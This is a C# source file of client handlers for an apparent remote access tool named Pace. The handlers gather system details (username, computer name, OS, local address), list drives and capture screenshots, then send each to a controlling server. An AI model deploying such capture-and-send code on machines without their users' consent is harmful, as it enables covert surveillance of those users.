using Pace.Client.Configuration;
using Pace.Client.System;
using Pace.Common.Network;
using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using System.IO;
using System.Linq;

namespace Pace.Client.Handlers
{
    public static class SystemHandlers
    {
        public static void HandleGetSystemInfo(PaceClient client, IPacket packet)
        {
            var systemInfo = SystemInformation.Get();
            var addressInfo = client.LocalAddress.Split(':');

            var infoPacket = new GetSystemInfoResponsePacket(
                ClientConfiguration.Identifier,
                addressInfo[0],
                int.Parse(addressInfo[1]),
                systemInfo.UserName,
                systemInfo.ComputerName,
                systemInfo.OperatingSystem
            );

            client.SendPacket(infoPacket);
        }

        public static void HandleGetDrives(PaceClient client, IPacket packet)
        {
            var drives = DriveInfo.GetDrives();
            var driveNames = drives.Select(drive => drive.Name).ToArray();

            var response = new GetDrivesResponsePacket(driveNames);

            client.SendPacket(response);
        }

        public static void HandleTakeScreenshot(PaceClient client, IPacket packet)
        {
            var screenshot = ScreenCapture.Take();

            byte[] screenshotBytes = ScreenCapture.ImageToBytes(screenshot);

            var screenshotResponsePacket = new TakeScreenshotResponsePacket(screenshotBytes);

            client.SendPacket(screenshotResponsePacket);
        }
    }
}